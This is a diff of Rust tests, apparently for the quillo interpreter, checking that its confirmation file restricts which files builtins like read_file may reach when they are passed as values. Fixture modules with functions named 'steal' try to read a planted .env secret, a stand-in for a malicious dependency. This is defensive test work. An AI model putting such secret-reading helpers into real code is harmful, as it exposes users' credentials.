+    assert_eq!(send(port, "GET", "/same", &[], "").body, "true <builtin read_file> fn false");
+    assert_eq!(send(port, "GET", "/json", &[], "").body, "refused");
+    drop(g);
+    assert!(!d.join("out.txt").exists() && !d.join("data/x.db").exists());
+    assert!(read(&log).contains("kit/badge.qwe: the path .env was refused"), "{}", read(&log));
+}
+
+/// With no `quillo.confirmed`, nothing holds the run and a builtin taken as a value is the one
+/// named, as it was: the same program's helpers read and write what they are handed, and the
+/// builtin compares, shows and is typed as before (src/interp.rs, FEEDBACK83.md Q-1300, found by
+/// the coverage tests; branch feedback82-85).
+#[test]
+fn with_nothing_confirmed_a_builtin_taken_as_a_value_is_as_it_was() {
+    let d = dir("x2-unheld");
+    write(&d, "main.qwe", "use lib/config.qwe\nimport kit/badge.qwe use Badge, steal, rf\nroute GET / = <html><body><Badge/></body></html>\nroute GET /s = steal()\nroute GET /w = apply2(write_file, \"out.txt\", \"x\") ?? \"written\"\nroute GET /same = str(rf() == read_file) + \" \" + str(rf())\n");
+    write(&d, "lib/config.qwe", X2_LIB);
+    write(&d, "kit/badge.qwe", "use ../lib/config.qwe\ncomponent Badge() { <b>b</b> }\nfn steal() = each([\".env\"], read_file)[0]\nfn rf() = read_file\n");
+    write(&d, ".env", "SECRET=1\n");
+    let (g, port, _) = serve(&d, &[]);
+    assert_eq!(send(port, "GET", "/s", &[], "").body, "SECRET=1\n");
+    assert_eq!(send(port, "GET", "/w", &[], "").body, "written");
+    assert_eq!(send(port, "GET", "/same", &[], "").body, "true <builtin read_file>");
+    drop(g);
+    assert_eq!(read(&d.join("out.txt")), "x");
+}
+
+/// A file with an empty block and a file with none are each confirmed for nothing, and each is
+/// named in the refusal of what it hands on, a name in other letters too (`kit/ünï.qwe`); a path
+/// in other letters is held as any (src/interp.rs, FEEDBACK83.md Q-1300, found by the coverage
+/// tests; branch feedback82-85).
+#[test]
+fn a_builtin_handed_on_by_a_file_with_an_empty_block_or_none_is_held_to_that_file() {
+    let d = dir("x2-empty");
+    write(&d, "main.qwe", "use lib/config.qwe\nimport kit/badge.qwe use Badge, steal\nimport kit/ünï.qwe use steal_u\nroute GET / = <html><body><Badge/></body></html>\nroute GET /e = steal().error ?? \"read\"\nroute GET /u = steal_u().error ?? \"read\"\nroute GET /mine = apply(read_file, \"données/é.txt\")\n");
+    write(&d, "lib/config.qwe", X2_LIB);
+    write(&d, "kit/badge.qwe", "use ../lib/config.qwe\ncomponent Badge() { <b>b</b> }\nfn steal() = apply(read_file, \"données/é.txt\")\n");
+    write(&d, "kit/ünï.qwe", "use ../lib/config.qwe\nfn steal_u() = apply(read_file, \".env\")\n");
+    write(&d, ".env", "SECRET=1\n");
+    write(&d, "données/é.txt", "É\n");
+    write(&d, "quillo.confirmed", "[\"kit/badge.qwe\"]\n\n[\"lib/config.qwe\"]\nfiles = [\".env\", \"données/é.txt\"]\n\n[\"main.qwe\"]\nfiles = [\"données/é.txt\"]\n");
+    let (code, out) = quillo(&d, &["check", "main.qwe"]);
+    assert_eq!(code, Some(0), "{}", out);
+    let (g, port, _) = serve(&d, &[]);
+    assert_eq!(send(port, "GET", "/e", &[], "").body, "read_file: données/é.txt is not confirmed for kit/badge.qwe (quillo confirm)");
+    assert_eq!(send(port, "GET", "/u", &[], "").body, "read_file: .env is not confirmed for kit/ünï.qwe (quillo confirm)");
+    assert_eq!(send(port, "GET", "/mine", &[], "").body, "É\n");
+    drop(g);
+}
+
+/// The stand-ins a builtin taken as a value is held by: 1,024. With 1,023 taken by as many files
+/// at the start, the 1,024th, a file's at a request, is held to that file; the 1,025th is refused
+/// whatever its file is confirmed for, the main file's too, never held to the helper's; the file
+/// that has one keeps it; a builtin called by its name needs none (src/interp.rs, FEEDBACK83.md
+/// Q-1300, found by the coverage tests; branch feedback82-85).
+#[test]
+fn past_the_stand_ins_a_builtin_taken_as_a_value_is_refused_not_held_to_the_helper() {
+    let d = dir("x2-limit");
+    let mut main = String::from("use lib/config.qwe\n");
+    for i in 1..=1023 {
+        write(&d, &format!("f/t{}.qwe", i), &format!("let t{} = read_file\n", i));
+        main.push_str(&format!("use f/t{}.qwe\n", i));
+    }
+    main.push_str("import kit/a.qwe use steal_a\nimport kit/b.qwe use steal_b\nroute GET /a = steal_a().error ?? \"read\"\nroute GET /b = steal_b().error ?? \"read\"\nroute GET /mine = apply(read_file, \"data.txt\").error ?? \"read\"\nroute GET /direct = secret()\nroute GET /t = t7(\".env\").error ?? \"read\"\n");
+    write(&d, "main.qwe", &main);
+    write(&d, "lib/config.qwe", X2_LIB);
+    write(&d, "kit/a.qwe", "use ../lib/config.qwe\nfn steal_a() = apply(read_file, \".env\")\n");
+    write(&d, "kit/b.qwe", "use ../lib/config.qwe\nfn steal_b() = apply(read_file, \".env\")\n");
+    write(&d, ".env", "SECRET=1\n");
+    write(&d, "data.txt", "D\n");
+    write(&d, "quillo.confirmed", "[\"lib/config.qwe\"]\nfiles = [\".env\"]\n\n[\"main.qwe\"]\nfiles = [\"data.txt\"]\n");
+    let (g, port, _) = serve(&d, &[]);
+    let full = "refused: more than 1024 builtins that reach out are taken as values in the program's files, and none holds this one (call it by its name)";
+    assert_eq!(send(port, "GET", "/a", &[], "").body, "read_file: .env is not confirmed for kit/a.qwe (quillo confirm)");
+    assert_eq!(send(port, "GET", "/b", &[], "").body, full);
+    assert_eq!(send(port, "GET", "/mine", &[], "").body, full);
+    assert_eq!(send(port, "GET", "/a", &[], "").body, "read_file: .env is not confirmed for kit/a.qwe (quillo confirm)");
+    assert_eq!(send(port, "GET", "/t", &[], "").body, "read_file: .env is not confirmed for f/t7.qwe (quillo confirm)");
+    assert_eq!(send(port, "GET", "/direct", &[], "").body, "SECRET=1\n");
+    drop(g);
 }
